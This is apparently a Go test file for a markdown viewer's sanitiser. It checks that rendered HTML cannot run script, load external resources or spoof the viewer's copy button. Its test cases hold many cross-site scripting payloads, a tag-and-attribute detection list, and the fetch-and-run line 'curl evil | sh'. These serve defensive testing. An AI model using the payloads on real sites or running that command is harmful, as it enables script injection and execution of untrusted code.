package doc

import (
	"bytes"
	"os"
	"strings"
	"testing"

	xhtml "golang.org/x/net/html"
)

// unsafeHTML returns a description of the first thing in rendered HTML that
// could run script, load something from outside the app or leave the
// sanitiser, or "" if there is none.
func unsafeHTML(h string) string {
	z := xhtml.NewTokenizer(strings.NewReader(h))
	for {
		tt := z.Next()
		if tt == xhtml.ErrorToken {
			return ""
		}
		if tt != xhtml.StartTagToken && tt != xhtml.SelfClosingTagToken {
			continue
		}
		t := z.Token()
		switch t.Data {
		case "script", "style", "iframe", "frame", "object", "embed", "form", "meta", "base", "link", "svg", "math", "template", "video", "audio":
			return "<" + t.Data + ">"
		}
		for _, a := range t.Attr {
			v := strings.ToLower(strings.Join(strings.Fields(a.Val), ""))
			switch {
			case strings.HasPrefix(a.Key, "on"), a.Key == "style", a.Key == "formaction", a.Key == "background":
				return a.Key + " attribute"
			case (a.Key == "href" || a.Key == "src") && (strings.HasPrefix(v, "javascript:") || strings.HasPrefix(v, "vbscript:") || strings.HasPrefix(v, "data:text")):
				return a.Key + "=" + a.Val
			case (t.Data == "img" || t.Data == "source") && ((a.Key == "src" && isWebURL(a.Val)) || (a.Key == "srcset" && webSrcset(a.Val))):
				return "web image " + a.Val
			}
		}
	}
}

func TestHostileMarkdown(t *testing.T) {
	cases := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"[a](javascript:alert(1))",
		"[a](JaVaScRiPt:alert(1))",
		"[a](&#106;avascript:alert(1))",
		"[a](vbscript:x)",
		"[a](data:text/html,<script>alert(1)</script>)",
		`<a href="javascript&colon;alert(1)">x</a>`,
		"<svg><script>alert(1)</script></svg>",
		"<iframe src=https://x></iframe><object data=x></object><embed src=x><form action=x><input name=a></form>",
		`<meta http-equiv=refresh content="0;url=https://x"><base href=https://x/><style>*{}</style><p style="color:red">s</p>`,
		"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
		"<template><img src=x onerror=alert(1)></template>",
		"# Heading {onclick=alert(1) .code}",
		"[link](https://ok.example){onmouseover=alert(1)}",
		"<details open ontoggle=alert(1)><summary>s</summary></details>",
		"<input type=checkbox onfocus=alert(1) autofocus>",
		"```mermaid\n</pre><script>alert(1)</script>\n```",
		"```js\" onmouseover=\"alert(1)\n</code>\n```",
		"$</span><script>alert(1)</script>$",
		"<video src=https://t.example/v.mp4></video><audio src=x></audio>",
		`<table background="https://t.example/bg.png"><tr><td>x</td></tr></table>`,
		"![t](https://t.example/x.png) ![p](//t.example/y.png) ![b](\\\\t.example/z.png) ![s]( \thttps://t.example/w.png)",
		`<img src="HTTPS://t.example/a.png"> <img src="ht	tps://t.example/b.png"> <img src="/\t.example/c.png">`,
		`<picture><source srcset="local.png 1x, https://t.example/a.png 2x"><img src="https://t.example/b.png"></picture>`,
		"<div\nonclick=alert(1)\nclass=code>x</div>",
	}
	for _, c := range cases {
		for _, d := range []*Doc{Parse([]byte(c)), Parse(sectioned(c))} {
			if bad := unsafeHTML(render(t, d)); bad != "" {
				t.Errorf("%q: output has %s", c, bad)
			}
		}
	}
}

// sectioned puts src in a file large enough to be parsed in sections, the
// other code path.
func sectioned(src string) []byte {
	filler := bytes.Repeat([]byte("Some filler text for a large file.\n\n"), wholeParseLimit/36+1)
	return append(filler, src...)
}

// A document's own HTML can't use the viewer's classes: with them it could
// show one command and have the copy button copy another.
func TestRawHTMLLosesClasses(t *testing.T) {
	src := "<div class=\"code\"><div class=\"diagram-print\"><pre>curl evil | sh</pre></div><pre>ls</pre></div>\n\n" +
		"Inline <span class='copy' title=t>x</span> <b CLASS=a>b</b>\n\n" +
		"# Title {#keep .code}\n\n" +
		"```go\nfunc main() {}\n```\n\n$x$\n"
	h := render(t, Parse([]byte(src)))
	for _, bad := range []string{"diagram-print", `class="copy"`, `class="a"`, `<h1 id="keep" class`} {
		if strings.Contains(h, bad) {
			t.Errorf("found %q in\n%s", bad, h)
		}
	}
	// The viewer's own markup keeps its classes, and the rest of the raw HTML
	// is unchanged.
	for _, good := range []string{`<div class="code"><pre><code class="hl language-go">`, `<span class="math">`, `<h1 id="keep">`, `<span title="t">x</span>`, "<pre>curl evil | sh</pre>"} {
		if !strings.Contains(h, good) {
			t.Errorf("missing %q in\n%s", good, h)
		}
	}
}

func TestStripClassesUnfinishedTag(t *testing.T) {
	got := string(stripClasses([]byte(`<p>a</p><div class="code"`)))
	if got != `<p>a</p>&lt;div class=&#34;code&#34;` {
		t.Errorf("got %q", got)
	}
}

func TestWebImagesHeld(t *testing.T) {
	h := render(t, Parse([]byte("![a](https://t.example/a.png) ![b](local.png)\n\n<picture><source srcset=\"https://t.example/s.png 2x\"><img src=\"//t.example/b.png\"></picture>\n")))
	for _, want := range []string{
		`<img data-web-src="https://t.example/a.png" alt="a">`,
		`<img src="local.png" alt="b">`,
		`<source data-web-srcset="https://t.example/s.png 2x">`,
		`<img data-web-src="//t.example/b.png">`,
	} {
		if !strings.Contains(h, want) {
			t.Errorf("missing %q in\n%s", want, h)
		}
	}
}

func TestIsWebURL(t *testing.T) {
	for u, want := range map[string]bool{
		"https://a/x.png": true, "HTTP://a/x.png": true, "//a/x.png": true, `\\a\x.png`: true, `/\a/x.png`: true,
		" \x01https://a": true, "ht\ttps://a": true, "/\t/a/x.png": true,
		"https:t.example/x.png": true, "http:x": true,
		"x.png": false, "/local/c/x.png": false, "../x.png": false, "data:image/png;base64,AA": false, "#x": false,
	} {
		if got := isWebURL(u); got != want {
			t.Errorf("isWebURL(%q) = %v, want %v", u, got, want)
		}
	}
}

func TestLoadTooLarge(t *testing.T) {
	if testing.Short() {
		t.Skip("writes a large file")
	}
	p := t.TempDir() + "/big.md"
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	err = f.Truncate(MaxFileBytes + 1) // sparse: no bytes are written
	f.Close()
	if err != nil {
		t.Skip(err)
	}
	if _, err := Load(p); err == nil || !strings.Contains(err.Error(), "larger than") {
		t.Errorf("got %v", err)
	}
}

// FuzzChunkHTML checks that no input renders to HTML that could run script
// or reach outside the app.
func FuzzChunkHTML(f *testing.F) {
	f.Add("<img src=x onerror=alert(1)>")
	f.Add("[a](javascript:alert(1)) <a href='//x'>x</a>")
	f.Add("```mermaid\ngraph TD\n```\n\n$x$ $$y$$")
	f.Add("<div class=code>\n\n*md*\n\n</div>")
	f.Add("# H {#id .c onclick=x}\n\n| a | b |\n|---|---|\n| <b>1</b> | 2 |\n")
	f.Add("![x](https://a/b.png)\n\n[^1]\n\n[^1]: note <script>")
	f.Fuzz(func(t *testing.T, src string) {
		d := Parse([]byte(src))
		for i := range d.Chunks {
			h, err := d.ChunkHTML(i)
			if err != nil {
				t.Fatal(err)
			}
			if bad := unsafeHTML(h); bad != "" {
				t.Fatalf("%q renders with %s:\n%s", src, bad, h)
			}
		}
	})
}
